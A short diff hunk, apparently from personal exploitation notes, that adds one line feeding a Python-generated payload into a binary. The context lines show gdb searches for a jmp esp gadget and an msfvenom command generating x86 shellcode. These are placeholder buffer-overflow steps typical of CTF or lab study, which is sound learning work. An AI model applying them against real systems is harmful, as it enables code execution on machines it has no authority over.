@@ -665,6 +665,7 @@ run
 info proc map
 find /b <start address under the heap>,<end address before stack>,0xff,0xe4
 msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
+./<file> <<< $(python <script>)
 
 
 
